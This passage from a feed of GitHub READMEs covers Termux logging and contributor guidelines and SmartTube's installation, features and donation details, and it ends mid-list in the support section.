&lt;p&gt;The plugin apps &lt;strong&gt;do not execute the commands themselves&lt;/strong&gt; but send execution intents to &lt;code&gt;Termux&lt;/code&gt; app, which has its own log level which can be set in &lt;code&gt;Termux&lt;/code&gt; app settings -&amp;gt; &lt;code&gt;Termux&lt;/code&gt; -&amp;gt; &lt;code&gt;Debugging&lt;/code&gt; -&amp;gt; &lt;code&gt;Log Level&lt;/code&gt;. So you must set log level for both &lt;code&gt;Termux&lt;/code&gt; and the respective plugin app settings to get all the info.&lt;/p&gt; 
&lt;p&gt;Once log levels have been set, you can run the &lt;code&gt;logcat&lt;/code&gt; command in &lt;code&gt;Termux&lt;/code&gt; app terminal to view the logs in realtime (&lt;code&gt;Ctrl+c&lt;/code&gt; to stop) or use &lt;code&gt;logcat -d &amp;gt; logcat.txt&lt;/code&gt; to take a dump of the log. You can also view the logs from a PC over &lt;code&gt;ADB&lt;/code&gt;. For more information, check official android &lt;code&gt;logcat&lt;/code&gt; guide &lt;a href="https://developer.android.com/studio/command-line/logcat"&gt;here&lt;/a&gt;.&lt;/p&gt; 
&lt;p&gt;Moreover, users can generate termux files &lt;code&gt;stat&lt;/code&gt; info and &lt;code&gt;logcat&lt;/code&gt; dump automatically too with terminal's long hold options menu &lt;code&gt;More&lt;/code&gt; -&amp;gt; &lt;code&gt;Report Issue&lt;/code&gt; option and selecting &lt;code&gt;YES&lt;/code&gt; in the prompt shown to add debug info. This can be helpful for reporting and debugging other issues. If the report generated is too large, then &lt;code&gt;Save To File&lt;/code&gt; option in context menu (3 dots on top right) of &lt;code&gt;ReportActivity&lt;/code&gt; can be used and the file viewed/shared instead.&lt;/p&gt; 
&lt;p&gt;Users must post complete report (optionally without sensitive info) when reporting issues. Issues opened with &lt;strong&gt;(partial) screenshots of error reports&lt;/strong&gt; instead of text will likely be automatically closed/deleted.&lt;/p&gt; 
&lt;h5&gt;Log Levels&lt;/h5&gt; 
&lt;ul&gt; 
 &lt;li&gt;&lt;code&gt;Off&lt;/code&gt; - Log nothing.&lt;/li&gt; 
 &lt;li&gt;&lt;code&gt;Normal&lt;/code&gt; - Start logging error, warn and info messages and stacktraces.&lt;/li&gt; 
 &lt;li&gt;&lt;code&gt;Debug&lt;/code&gt; - Start logging debug messages.&lt;/li&gt; 
 &lt;li&gt;&lt;code&gt;Verbose&lt;/code&gt; - Start logging verbose messages.&lt;/li&gt; 
&lt;/ul&gt; 
&lt;h2&gt;&lt;/h2&gt; 
&lt;h2&gt;For Maintainers and Contributors&lt;/h2&gt; 
&lt;p&gt;The &lt;a href="https://raw.githubusercontent.com/termux/termux-app/master/termux-shared"&gt;termux-shared&lt;/a&gt; library was added in &lt;a href="https://github.com/termux/termux-app/releases/tag/v0.109"&gt;&lt;code&gt;v0.109&lt;/code&gt;&lt;/a&gt;. It defines shared constants and utils of the Termux app and its plugins. It was created to allow for the removal of all hardcoded paths in the Termux app. Some of the termux plugins are using this as well and rest will in future. If you are contributing code that is using a constant or a util that may be shared, then define it in &lt;code&gt;termux-shared&lt;/code&gt; library if it currently doesn't exist and reference it from there. Update the relevant changelogs as well. Pull requests using hardcoded values &lt;strong&gt;will/should not&lt;/strong&gt; be accepted. Termux app and plugin specific classes must be added under &lt;code&gt;com.termux.shared.termux&lt;/code&gt; package and general classes outside it. The &lt;a href="https://raw.githubusercontent.com/termux/termux-app/master/termux-shared/LICENSE.md"&gt;&lt;code&gt;termux-shared&lt;/code&gt; &lt;code&gt;LICENSE&lt;/code&gt;&lt;/a&gt; must also be checked and updated if necessary when contributing code. The licenses of any external library or code must be honoured.&lt;/p&gt; 
&lt;p&gt;The main Termux constants are defined by &lt;a href="https://github.com/termux/termux-app/raw/master/termux-shared/src/main/java/com/termux/shared/termux/TermuxConstants.java"&gt;&lt;code&gt;TermuxConstants&lt;/code&gt;&lt;/a&gt; class. It also contains information on how to fork Termux or build it with your own package name. Changing the package name will require building the bootstrap zip packages and other packages with the new &lt;code&gt;$PREFIX&lt;/code&gt;, check &lt;a href="https://github.com/termux/termux-packages/wiki/Building-packages"&gt;Building Packages&lt;/a&gt; for more info.&lt;/p&gt; 
&lt;p&gt;Check &lt;a href="https://github.com/termux/termux-app/wiki/Termux-Libraries"&gt;Termux Libraries&lt;/a&gt; for how to import termux libraries in plugin apps and &lt;a href="https://github.com/termux/termux-app/wiki/Termux-Libraries#forking-and-local-development"&gt;Forking and Local Development&lt;/a&gt; for how to update termux libraries for plugins.&lt;/p&gt; 
&lt;p&gt;The &lt;code&gt;versionName&lt;/code&gt; in &lt;code&gt;build.gradle&lt;/code&gt; files of Termux and its plugin apps must follow the &lt;a href="https://semver.org/spec/v2.0.0.html"&gt;semantic version &lt;code&gt;2.0.0&lt;/code&gt; spec&lt;/a&gt; in the format &lt;code&gt;major.minor.patch(-prerelease)(+buildmetadata)&lt;/code&gt;. When bumping &lt;code&gt;versionName&lt;/code&gt; in &lt;code&gt;build.gradle&lt;/code&gt; files and when creating a tag for new releases on GitHub, make sure to include the patch number as well, like &lt;code&gt;v0.1.0&lt;/code&gt; instead of just &lt;code&gt;v0.1&lt;/code&gt;. The &lt;code&gt;build.gradle&lt;/code&gt; files and &lt;code&gt;attach_debug_apks_to_release&lt;/code&gt; workflow validates the version as well and the build/attachment will fail if &lt;code&gt;versionName&lt;/code&gt; does not follow the spec.&lt;/p&gt; 
&lt;h3&gt;Commit Messages Guidelines&lt;/h3&gt; 
&lt;p&gt;Commit messages &lt;strong&gt;must&lt;/strong&gt; use the &lt;a href="https://www.conventionalcommits.org"&gt;Conventional Commits&lt;/a&gt; spec so that chagelogs as per the &lt;a href="https://github.com/olivierlacan/keep-a-changelog"&gt;Keep a Changelog&lt;/a&gt; spec can automatically be generated by the &lt;a href="https://github.com/termux/create-conventional-changelog"&gt;&lt;code&gt;create-conventional-changelog&lt;/code&gt;&lt;/a&gt; script, check its repo for further details on the spec. &lt;strong&gt;The first letter for &lt;code&gt;type&lt;/code&gt; and &lt;code&gt;description&lt;/code&gt; must be capital and description should be in the present tense.&lt;/strong&gt; The space after the colon &lt;code&gt;:&lt;/code&gt; is necessary. For a breaking change, add an exclamation mark &lt;code&gt;!&lt;/code&gt; before the colon &lt;code&gt;:&lt;/code&gt;, so that it is highlighted in the chagelog automatically.&lt;/p&gt; 
&lt;pre&gt;&lt;code&gt;&amp;lt;type&amp;gt;[optional scope]: &amp;lt;description&amp;gt;

[optional body]

[optional footer(s)]
&lt;/code&gt;&lt;/pre&gt; 
&lt;p&gt;&lt;strong&gt;Only the &lt;code&gt;types&lt;/code&gt; listed below must be used exactly as they are used in the changelog headings.&lt;/strong&gt; For example, &lt;code&gt;Added: Add foo&lt;/code&gt;, &lt;code&gt;Added|Fixed: Add foo and fix bar&lt;/code&gt;, &lt;code&gt;Changed!: Change baz as a breaking change&lt;/code&gt;, etc. You can optionally add a scope as well, like &lt;code&gt;Fixed(terminal): Fix some bug&lt;/code&gt;. &lt;strong&gt;Do not use anything else as type, like &lt;code&gt;add&lt;/code&gt; instead of &lt;code&gt;Added&lt;/code&gt;, etc.&lt;/strong&gt;&lt;/p&gt; 
&lt;ul&gt; 
 &lt;li&gt;&lt;strong&gt;Added&lt;/strong&gt; for new features.&lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;Changed&lt;/strong&gt; for changes in existing functionality.&lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;Deprecated&lt;/strong&gt; for soon-to-be removed features.&lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;Removed&lt;/strong&gt; for now removed features.&lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;Fixed&lt;/strong&gt; for any bug fixes.&lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;Security&lt;/strong&gt; in case of vulnerabilities.&lt;/li&gt; 
&lt;/ul&gt; 
&lt;h2&gt;&lt;/h2&gt; 
&lt;h2&gt;Forking&lt;/h2&gt; 
&lt;ul&gt; 
 &lt;li&gt;Check &lt;a href="https://github.com/termux/termux-app/raw/master/termux-shared/src/main/java/com/termux/shared/termux/TermuxConstants.java"&gt;&lt;code&gt;TermuxConstants&lt;/code&gt;&lt;/a&gt; javadocs for instructions on what changes to make in the app to change package name.&lt;/li&gt; 
 &lt;li&gt;You also need to recompile bootstrap zip for the new package name. Check &lt;a href="https://github.com/termux/termux-packages/wiki/For-maintainers#build-bootstrap-archives"&gt;building bootstrap&lt;/a&gt;, &lt;a href="https://github.com/termux/termux-app/issues/1983"&gt;here&lt;/a&gt; and &lt;a href="https://github.com/termux/termux-app/issues/2081#issuecomment-865280111"&gt;here&lt;/a&gt;.&lt;/li&gt; 
 &lt;li&gt;Currently, not all plugins use &lt;code&gt;TermuxConstants&lt;/code&gt; from &lt;code&gt;termux-shared&lt;/code&gt; library and have hardcoded &lt;code&gt;com.termux&lt;/code&gt; values and will need to be manually patched.&lt;/li&gt; 
 &lt;li&gt;If forking termux plugins, check &lt;a href="https://github.com/termux/termux-app/wiki/Termux-Libraries#forking-and-local-development"&gt;Forking and Local Development&lt;/a&gt; for info on how to use termux libraries for plugins.&lt;/li&gt; 
&lt;/ul&gt;</description>
    </item>
    
    <item>
      <title>yuliskov/SmartTube</title>
      <link>https://github.com/yuliskov/SmartTube</link>
      <description>&lt;p&gt;Browse media content with your own rules on Android TV&lt;/p&gt;&lt;hr&gt;&lt;h1&gt;SmartTube&lt;/h1&gt; 
&lt;!-- &lt;img width="100" src="https://github.com/yuliskov/SmartTube/blob/master/smarttubetv/src/ststable/res/mipmap-nodpi/app_icon.png" alt="logo"/&gt; --&gt; 
&lt;p&gt;&lt;img src="https://raw.githubusercontent.com/yuliskov/SmartTube/master/images/browse_home.png" alt="The app screenshot"&gt;&lt;/p&gt; 
&lt;p&gt;SmartTube is a free and open-source advanced media player for Android TVs and TV boxes. It allows you to play content from various public sources.&lt;/p&gt; 
&lt;h3&gt;âœ… Features&lt;/h3&gt; 
&lt;ul&gt; 
 &lt;li&gt;No ads&lt;/li&gt; 
 &lt;li&gt;SponsorBlock integration&lt;/li&gt; 
 &lt;li&gt;Adjustable playback speed&lt;/li&gt; 
 &lt;li&gt;8K resolution support&lt;/li&gt; 
 &lt;li&gt;60fps playback&lt;/li&gt; 
 &lt;li&gt;HDR compatibility&lt;/li&gt; 
 &lt;li&gt;View live chat&lt;/li&gt; 
 &lt;li&gt;Customizable buttons&lt;/li&gt; 
 &lt;li&gt;Does not require Google Services&lt;/li&gt; 
 &lt;li&gt;Helpful international community&lt;/li&gt; 
&lt;/ul&gt; 
&lt;h3&gt;â�Œ Limitations&lt;/h3&gt; 
&lt;ul&gt; 
 &lt;li&gt;Not supported on phones and tablets&lt;/li&gt; 
 &lt;li&gt;Comment functionality is unstable&lt;/li&gt; 
 &lt;li&gt;Voice search and casting performance may be inferior to official apps, depending on your device&lt;/li&gt; 
&lt;/ul&gt; 
&lt;p&gt;Give it a try!&lt;/p&gt; 
&lt;p&gt;&lt;strong&gt;Do you have any question?&lt;/strong&gt; Ctrl+F or âŒ˜F this readme first!&lt;/p&gt; 
&lt;p&gt;&lt;a href="https://raw.githubusercontent.com/yuliskov/SmartTube/master/#installation"&gt;&lt;strong&gt;Installation&lt;/strong&gt;&lt;/a&gt; | &lt;a href="https://smarttubeapp.github.io"&gt;&lt;strong&gt;Official Site&lt;/strong&gt;&lt;/a&gt; | &lt;a href="https://raw.githubusercontent.com/yuliskov/SmartTube/master/#donation"&gt;&lt;strong&gt;Donation&lt;/strong&gt;&lt;/a&gt; | &lt;a href="https://raw.githubusercontent.com/yuliskov/SmartTube/master/#faq"&gt;&lt;strong&gt;FAQ&lt;/strong&gt;&lt;/a&gt; | &lt;a href="https://raw.githubusercontent.com/yuliskov/SmartTube/master/#support"&gt;Support / Chat&lt;/a&gt; | &lt;a href="https://raw.githubusercontent.com/yuliskov/SmartTube/master/#build"&gt;Build&lt;/a&gt; | &lt;a href="https://jtbrinkmann.de/tools/android-strings.xml-translator.html"&gt;Translate the app&lt;/a&gt; | &lt;a href="https://t.me/s/SmartTubeNewsEN"&gt;Changelog&lt;/a&gt; | &lt;a href="https://raw.githubusercontent.com/yuliskov/SmartTube/master/#liability"&gt;Liability&lt;/a&gt;&lt;/p&gt; 
&lt;h2&gt;Device support&lt;/h2&gt; 
&lt;p&gt;&lt;img src="https://raw.githubusercontent.com/yuliskov/SmartTube/master/images/new/upload_f6ab10668ea7793f099108f2b2230406.png" alt="&lt;span&gt;âœ…&lt;/span&gt; supported: all Android TVs and TV boxes (incl. FireTV, NVIDIA Shield &amp;amp; Google Chromecast with Google TV), even older ones with Android 4.3 (Kitkat). &lt;span&gt;â�Œ&lt;/span&gt; not supported: Smartphones, non-Android plattforms like Samsung Tizen, LG webOS, iOS, etc. "&gt;&lt;/p&gt; 
&lt;ul&gt; 
 &lt;li&gt;&lt;strong&gt;supported:&lt;/strong&gt; all Android TVs and TV boxes (incl. FireTV, NVIDIA Shield &amp;amp; Google Chromecast with Google TV), even older ones with Android 4.3 (Kitkat).&lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;not supported:&lt;/strong&gt; Smartphones, non-Android plattforms like Samsung Tizen, LG webOS, iOS, etc.&lt;/li&gt; 
&lt;/ul&gt; 
&lt;h2&gt;Installation&lt;/h2&gt; 
&lt;blockquote&gt; 
 &lt;p&gt;&lt;a href="https://raw.githubusercontent.com/yuliskov/SmartTube/master/images/new/zPV0imF.mp4"&gt;video of the installation&lt;/a&gt; (note: download url changed to &lt;code&gt;kutt.it/stn_beta&lt;/code&gt; or &lt;code&gt;kutt.it/stn_stable&lt;/code&gt;)&lt;/p&gt; 
&lt;/blockquote&gt; 
&lt;p&gt;&lt;strong&gt;Do not&lt;/strong&gt; download SmartTube from any &lt;strong&gt;app store&lt;/strong&gt;, APK websites or blogs; these were uploaded by other people and may contain malware or ads. SmartTube is not officially published on any app store. Sadly, the Google PlayStore does not allow ad-free Youtube apps using unofficial APIs.&lt;/p&gt; 
&lt;p&gt;There is a &lt;strong&gt;beta release&lt;/strong&gt; (recommended) and a &lt;strong&gt;stable release&lt;/strong&gt;. Beta gets new features and bugfixes faster than the stable release.&lt;/p&gt; 
&lt;p&gt;You can use either of the following methods to install the app:&lt;/p&gt; 
&lt;ul&gt; 
 &lt;li&gt;(&lt;strong&gt;easiest&lt;/strong&gt;) install &lt;a href="https://www.aftvnews.com/downloader/"&gt;Downloader by AFTVnews&lt;/a&gt; on your Android TV, open it and enter &lt;code&gt;kutt.it/stn_beta&lt;/code&gt; or &lt;code&gt;kutt.it/stn_stable&lt;/code&gt;, then read, understand and confirm the security prompts. (&lt;small&gt;You can also enter &lt;a href="https://aftv.news/79015"&gt;&lt;strong&gt;79015&lt;/strong&gt;&lt;/a&gt; (for beta) or &lt;a href="https://aftv.news/28544"&gt;&lt;strong&gt;28544&lt;/strong&gt;&lt;/a&gt; (for stable), but this requires an extra step to install the AFTVnews Downloader browser addon if you haven't already.&lt;/small&gt;)&lt;/li&gt; 
 &lt;li&gt;install a file transfer app on your Android TV, download the APK on your phone or computer and transfer it to your TV (e.g. &lt;a href="https://sendfilestotv.app/"&gt;&lt;em&gt;Send Files to TV&lt;/em&gt;&lt;/a&gt; from the Google Play Store / Amazon AppStore)&lt;/li&gt; 
 &lt;li&gt;download the APK onto a USB stick, put the USB stick into your TV and use a file manager app from the Google Play Store / Amazon AppStore (e.g. &lt;a href="https://play.google.com/store/apps/details?id=nextapp.fx"&gt;&lt;em&gt;FX File Explorer&lt;/em&gt;&lt;/a&gt; or &lt;a href="https://play.google.com/store/apps/details?id=com.lonelycatgames.Xplore"&gt;&lt;em&gt;X-plore&lt;/em&gt;&lt;/a&gt;). Android's preinstalled file manager does not work! Do &lt;strong&gt;not&lt;/strong&gt; get the ad-infested &lt;em&gt;FileCommander&lt;/em&gt;.&lt;/li&gt; 
 &lt;li&gt;if you are an advanced user, you can install it using ADB. &lt;a href="https://fossbytes.com/side-load-apps-android-tv/#h-how-to-sideload-apps-on-your-android-tv-using-adb"&gt;guide&lt;/a&gt; | &lt;a href="https://www.aftvnews.com/sideload/"&gt;alternative guide&lt;/a&gt;&lt;/li&gt; 
&lt;/ul&gt; 
&lt;p&gt;&lt;strong&gt;Troubleshooting:&lt;/strong&gt; See device specific notes below. If installation fails, either your &lt;strong&gt;disk space is full&lt;/strong&gt; or the APK file didn't download correctly; clear up space and try downloading again. If the app installed, but crashes when opening, make sure to install it to internal memory, not to an SD card / external storage.&lt;/p&gt; 
&lt;p&gt;&lt;strong&gt;The app has a built-in updater&lt;/strong&gt; with changelog. You can also find all releases and the &lt;strong&gt;changelog&lt;/strong&gt; on the &lt;a href="https://t.me/s/SmartTubeNewsEN"&gt;Telegram channel @SmartTubeNewsEN&lt;/a&gt; (readable without account) or on &lt;a href="https://github.com/yuliskov/SmartTube/releases/"&gt;Github&lt;/a&gt;.&lt;/p&gt; 
&lt;blockquote&gt; 
 &lt;p&gt;latest &lt;a href="https://github.com/yuliskov/SmartTube/releases/download/latest/smarttube_beta.apk"&gt;&lt;strong&gt;beta download&lt;/strong&gt;&lt;/a&gt;&lt;/p&gt; 
 &lt;p&gt;latest &lt;a href="https://github.com/yuliskov/SmartTube/releases/download/latest/smarttube_stable.apk"&gt;stable download&lt;/a&gt;&lt;/p&gt; 
&lt;/blockquote&gt; 
&lt;h3&gt;Installation (Chromecast with Google TV)&lt;/h3&gt; 
&lt;p&gt;On &lt;strong&gt;Chromecast with Google TV&lt;/strong&gt;, installation of apps is blocked by default, so an extra step is required:&lt;/p&gt; 
&lt;blockquote&gt; 
 &lt;p&gt;&lt;strong&gt;4.1. Enable Developer Options&lt;/strong&gt;&lt;/p&gt; 
 &lt;p&gt;On your Chromecast, open the side menu and go to &lt;em&gt;Settings &amp;gt; System &amp;gt; About&lt;/em&gt;. Scroll down to the &lt;em&gt;Android TV OS build&lt;/em&gt; section and click that repeatedly. A toast message will appear, explaining that you are a few steps away from being a developer. Continue clicking until you trigger it.&lt;/p&gt; 
 &lt;p&gt;&lt;strong&gt;4.2. Turn on the "unknown sources" setting&lt;/strong&gt;&lt;/p&gt; 
 &lt;p&gt;Go back to the main &lt;em&gt;Settings&lt;/em&gt; page and select &lt;em&gt;Apps &amp;gt; Security &amp;amp; Restrictions &amp;gt; Unknown sources&lt;/em&gt;. Turn on the toggle for [&lt;em&gt;Downloader by AFTVnews&lt;/em&gt; or] whichever file browser you decided to use [...].&lt;/p&gt; 
 &lt;p&gt;[&lt;a href="https://www.androidpolice.com/2021/02/07/how-to-sideload-any-apk-on-the-chromecast-with-android-tv/#install-the-apk"&gt;source &amp;amp; picture guide&lt;/a&gt;]&lt;/p&gt; 
&lt;/blockquote&gt; 
&lt;p&gt;After this, you can follow the &lt;a href="https://raw.githubusercontent.com/yuliskov/SmartTube/master/#installation"&gt;general installation guide&lt;/a&gt; above.&lt;/p&gt; 
&lt;h3&gt;Installation (Xiaomi devices with Chinese firmware)&lt;/h3&gt; 
&lt;p&gt;Xiaomi's &lt;strong&gt;Chinese firmware&lt;/strong&gt; might block the installation &lt;strong&gt;of the beta version&lt;/strong&gt;. The international firmware is not affected. Solutions:&lt;/p&gt; 
&lt;ol&gt; 
 &lt;li&gt;use SmartTube's &lt;strong&gt;stable version&lt;/strong&gt; instead (&lt;strong&gt;recommended&lt;/strong&gt;)&lt;/li&gt; 
 &lt;li&gt;use the international firmware for your device&lt;/li&gt; 
 &lt;li&gt;(if your device is from 2020 or before) You can do a factory reset and then install SmartTube beta before doing any system updates. You can then safely update your system, SmartTube should continue working.&lt;/li&gt; 
&lt;/ol&gt; 
&lt;h3&gt;Updating&lt;/h3&gt; 
&lt;p&gt;The app has a built-in updater. You only need to follow the installation procedure &lt;strong&gt;once&lt;/strong&gt;. A few seconds after launching SmartTube, it will notify you if there is any update and also show a changelog. You can disable automatic update checks or manually update in the settings under "about".&lt;/p&gt; 
&lt;p&gt;If the installation fails, either your &lt;strong&gt;disk space is full&lt;/strong&gt; or the update didn't download correctly; clear up space and try updating again (&lt;em&gt;Settings &amp;gt; About &amp;gt; Check for updates&lt;/em&gt;).&lt;/p&gt; 
&lt;h2&gt;Compatibility&lt;/h2&gt; 
&lt;p&gt;SmartTube requires Android 4.3 or above. It does not work on non-Android devices (incl. LG or Samsung TVs). On unsupported TVs, you can use a TV stick or TV box. Though this app technically runs on smartphones and tablets, it is not optimized for such and offers no official support!&lt;/p&gt; 
&lt;p&gt;It has been successfully tested on TVs, TV boxes and TV sticks that are based on Android, including:&lt;/p&gt; 
&lt;ul&gt; 
 &lt;li&gt;Android TVs &amp;amp; Google TVs (e.g. Philips, Sony)&lt;/li&gt; 
 &lt;li&gt;Chromecast with Google TV &amp;amp; TVs with &lt;em&gt;Chromecast built-in&lt;/em&gt;&lt;/li&gt; 
 &lt;li&gt;Amazon FireTV stick (all generations)&lt;/li&gt; 
 &lt;li&gt;NVIDIA Shield&lt;/li&gt; 
 &lt;li&gt;TV boxes running Android (many cheap chinese no-name boxes)&lt;/li&gt; 
 &lt;li&gt;Xiaomi Mi Box&lt;/li&gt; 
&lt;/ul&gt; 
&lt;h2&gt;Features&lt;/h2&gt; 
&lt;h3&gt;Adblocking&lt;/h3&gt; 
&lt;p&gt;SmartTube does not show any ad banners, preroll ads or ad intermissions. It not just tries to prevent them, it is literally programmed to be completely &lt;strong&gt;unable&lt;/strong&gt; to display any ads, so YouTube cannot slip anything in. This also means you cannot allow ads or whitelist channels. Some YouTube channels include sponsored messages in their videos, these can also be skipped, see &lt;a href="https://raw.githubusercontent.com/yuliskov/SmartTube/master/#SponsorBlock"&gt;SponsorBlock&lt;/a&gt; below.&lt;/p&gt; 
&lt;h3&gt;SponsorBlock&lt;/h3&gt; 
&lt;p&gt;SmartTube includes a SponsorBlock integration. From the &lt;a href="https://sponsor.ajay.app/"&gt;SponsorBlock website&lt;/a&gt;:&lt;/p&gt; 
&lt;blockquote&gt; 
 &lt;p&gt;SponsorBlock is an open-source crowdsourced browser extension and open API for &lt;strong&gt;skipping sponsor segments&lt;/strong&gt; in YouTube videos. [...] the extension automatically skips sponsors &lt;strong&gt;it knows about&lt;/strong&gt; using a privacy preserving query system. It also supports skipping &lt;strong&gt;other categories&lt;/strong&gt;, such as intros, outros and reminders to subscribe [and non-music parts in music videos].&lt;/p&gt; 
&lt;/blockquote&gt; 
&lt;p&gt;You can select which categories you want to skip in the settings. Unlike the browser addon, in SmartTube you cannot submit new segments (TVs and TV remotes aren't great devices for such precise operations). Note that SponsorBlock is a free and voluntary project based on user submissions, so don't expect it to 100% work every time. Sometimes, sponsor segments are not yet submitted to the database, sometimes the SponsorBlock servers are offline/overloaded.&lt;/p&gt; 
&lt;h3&gt;Casting&lt;/h3&gt; 
&lt;p&gt;To cast videos from your phone (or other devices), you must link that device to your TV. Unlike the original YouTube app, SmartTube does not automatically show up when you are in the same wifi network. How to link your smartphone and TV:&lt;/p&gt; 
&lt;ol&gt; 
 &lt;li&gt;open SmartTube and go to settings&lt;/li&gt; 
 &lt;li&gt;go to "Remote control" (2nd option)&lt;/li&gt; 
 &lt;li&gt;open your YouTube app on your phone, go to settings &amp;gt; General &amp;gt; watch on TV&lt;/li&gt; 
 &lt;li&gt;click on &lt;em&gt;connect using TV-code&lt;/em&gt; and enter the code from your TV&lt;/li&gt; 
&lt;/ol&gt; 
&lt;p&gt;&lt;a href="https://t.me/SmartTubeEN/8514"&gt;&lt;strong&gt;Screenshot guide&lt;/strong&gt;&lt;/a&gt;&lt;/p&gt; 
&lt;p&gt;Due to technical limitations, you need to open the app on the TV before casting; SmartTube cannot automatically wake up the TV.&lt;/p&gt; 
&lt;h3&gt;Picture-in-Picture (PiP)&lt;/h3&gt; 
&lt;p&gt;SmartTube supports playing videos in PiP mode. This needs to be enabled under &lt;em&gt;Settings &amp;gt; General &amp;gt; Background playback &amp;gt; Picture in picture&lt;/em&gt;. The video will go into PiP mode when you press home while playing a video, and also when you press &lt;em&gt;back&lt;/em&gt; if enabled in &lt;em&gt;Settings &amp;gt; General &amp;gt; Background playback (activation)&lt;/em&gt;.&lt;/p&gt; 
&lt;h3&gt;Adjust Speed&lt;/h3&gt; 
&lt;p&gt;You can adjust the playback speed pressing the speed-indicator icon (gauge) in the top row of the player. This is remembered across videos. Some speeds may case frame drops, this is a known issue.&lt;/p&gt; 
&lt;h3&gt;Voice Search&lt;/h3&gt; 
&lt;p&gt;To enable global voice search, an additional app must be installed alongside SmartTube. This &lt;em&gt;bridge app&lt;/em&gt; can intercept the System's attempts to open the original YouTube app and open SmartTube instead. For this to work, you must uninstall the original YouTube app. We know this sucks, but you can always reinstall it if you change your mind. The &lt;em&gt;bridge app&lt;/em&gt; will not show up in your launcher and you cannot launch it directly; it is only used internally by the system's voice search. On some devices, you need to explicitly say "Youtube" when searching (e.g. say "youtube cute cats" instead of just "cute cats").&lt;/p&gt; 
&lt;p&gt;&lt;strong&gt;On Amazon Fire TV&lt;/strong&gt;:&lt;/p&gt; 
&lt;ol&gt; 
 &lt;li&gt;uninstall the original YouTube app (no root required)&lt;/li&gt; 
 &lt;li&gt;download and install the Amazon Bridge SmartTube app: &lt;a href="https://kutt.it/stn_bridge_amazon"&gt;https://kutt.it/stn_bridge_amazon&lt;/a&gt; (e.g. via &lt;em&gt;Downloader by AFTVnews&lt;/em&gt;)&lt;/li&gt; 
&lt;/ol&gt; 
&lt;p&gt;&lt;strong&gt;On Google Chromecast with Google TV&lt;/strong&gt;:&lt;/p&gt; 
&lt;ol&gt; 
 &lt;li&gt;uninstall the original YouTube app (no root required)&lt;/li&gt; 
 &lt;li&gt;download and install the ATV Bridge SmartTube app: &lt;a href="https://kutt.it/stn_bridge_atv"&gt;https://kutt.it/stn_bridge_atv&lt;/a&gt; (e.g. via &lt;em&gt;Downloader by AFTVnews&lt;/em&gt;)&lt;/li&gt; 
&lt;/ol&gt; 
&lt;p&gt;&lt;strong&gt;On all other Android devices&lt;/strong&gt;, sadly root is required to enable this:&lt;/p&gt; 
&lt;ol&gt; 
 &lt;li&gt;root your device (search for a guide for your specific device)&lt;/li&gt; 
 &lt;li&gt;uninstall the official YouTube app using root (&lt;code&gt;adb shell pm uninstall com.google.android.youtube.tv&lt;/code&gt;)&lt;/li&gt; 
 &lt;li&gt;download and install the ATV Bridge SmartTube app: &lt;a href="https://kutt.it/stn_bridge_atv"&gt;https://kutt.it/stn_bridge_atv&lt;/a&gt; (e.g. via &lt;em&gt;Downloader by AFTVnews&lt;/em&gt;)&lt;/li&gt; 
&lt;/ol&gt; 
&lt;h2&gt;Donation&lt;/h2&gt; 
&lt;p&gt;If you want to support my developments you are welcome to buy me a cup of coffee :)&lt;/p&gt; 
&lt;ul&gt; 
 &lt;li&gt;&lt;a href="https://www.patreon.com/smarttube"&gt;&lt;strong&gt;Patreon (Visa, Mastercard, PayPal)&lt;/strong&gt;&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;PayPal&lt;/strong&gt;: firsth
  &lt;!-- abc@def --&gt;ash@gmai
  &lt;!-- @abc.com --&gt;l.com&lt;/li&gt; 
&lt;/ul&gt; 
&lt;!-- &gt; [**Buy me a coffee**](https://www.buymeacoffee.com/stube) --&gt; 
&lt;ul&gt; 
 &lt;li&gt;&lt;strong&gt;BTC&lt;/strong&gt;: 1JAT5VVWarVBkpVbNDn8UA8HXNdrukuBSx&lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;LTC&lt;/strong&gt;: ltc1qgc24eq9jl9cq78qnd5jpqhemkajg9vudwyd8pw&lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;ETH&lt;/strong&gt;: 0xe455E21a085ae195a097cd4F456051A9916A5064&lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;ETC&lt;/strong&gt;: 0x209eCd33Fa61fA92167595eB3Aea92EE1905c815&lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;TRX&lt;/strong&gt;: TJNPY794aSGZf3WGHTna2VCWm2G5Yua7E8&lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;USDT (TRC20)&lt;/strong&gt;: TJNPY794aSGZf3WGHTna2VCWm2G5Yua7E8&lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;USDT (BEP20)&lt;/strong&gt;: 0x64B28da787BE6ac5889D276A5638d4f077840eC5&lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;USDT (ERC20)&lt;/strong&gt;: 0xe455e21a085ae195a097cd4f456051a9916a5064&lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;TON&lt;/strong&gt;: UQAc9zgnnzwS8yb5wxAu5CB0RddmjPBjWI-n46oQ7XfCQrgI&lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;XMR&lt;/strong&gt;: 48QsMjqfkeW54vkgKyRnjodtYxdmLk6HXfTWPSZoaFPEDpoHDwFUciGCe1QC9VAeGrgGw4PKNAksX9RW7myFqYJQDN5cHGT&lt;/li&gt; 
&lt;/ul&gt; 
&lt;h2&gt;Support&lt;/h2&gt; 
&lt;p&gt;&lt;strong&gt;Please check the &lt;a href="https://raw.githubusercontent.com/yuliskov/SmartTube/master/#faq"&gt;FAQ&lt;/a&gt; first!&lt;/strong&gt; Also at least have a short look at the recent chat history.&lt;/p&gt; 
&lt;p&gt;You can report in our Telegram group or via &lt;a href="https://github.com/yuliskov/SmartTube/issues"&gt;issue tracker on Github&lt;/a&gt; (account required).&lt;/p&gt; 
&lt;ul&gt; 
 &lt;li&gt;&lt;strong&gt;Telegram group (international)&lt;/strong&gt;: &lt;a href="http://t.me/SmartTubeEN"&gt;@SmartTubeEN&lt;/a&gt;&lt;/li&gt; 
